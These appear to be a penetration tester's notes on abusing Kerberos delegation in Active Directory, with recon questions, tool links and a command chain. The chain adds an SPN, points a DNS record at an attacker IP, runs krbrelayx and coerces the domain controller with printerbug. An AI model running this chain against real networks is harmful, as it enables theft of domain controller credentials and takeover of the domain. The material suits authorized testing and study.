# [Delegation](https://www.thehacker.recipes/ad/movement/kerberos/delegations)

## Questions to ask yourself
  *  Any user/computer objects with unreadable [delegation attributes](https://github.com/SpacemanHenry/hacknotes/blob/main/Information%20Gathering/Service%20Enumeration/LDAP.md#delegation-permissions)?
  *  Any unconstrained objects [kerberoastable](https://github.com/SpacemanHenry/hacknotes/blob/main/Exploitation/Authentication/Kerberos/Kerberoast.md)?
  *  What services have service principal names configured?
      *  What users have high privileges over those services?

## Things to remember
  *  Unconstrained delegation requires changes from default config for user accounts

## Useful tools
  *  [`krbrelayx`](https://github.com/dirkjanm/krbrelayx) toolkit for abusing unconstrained delegation
  *  [`impacket-getST`](https://github.com/fortra/impacket/blob/master/examples/getST.py) for impersonating users via constrained delegation

## [Unconstrained delegation](https://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html)
  *  Create new SPN, create DNS record pointing to attacker,
  *  Add FQDN of domain controller to `hosts` file to avoid DNS errors

```
git clone https://github.com/dirkjanm/krbrelayx && cd krbrelayx
python3 addspn.py -u corp.local\\sqlsvc -p 'password' -s host/FAKE.CORP.LOCAL ldap://DC.CORP.LOCAL
python3 dnstool.py -u corp.local\\sqlsvc -p 'password' -r FAKE.CORP.LOCAL -a add -d [ATTACKER IP] DC.CORP.LOCAL
python3 krbrelayx.py --krbsalt CORP.LOCALsqlsvc --krbpass 'password'
python3 printerbug.py corp.local/sqlsvc:'password'@DC.CORP.LOCAL FAKE.CORP.LOCAL
```
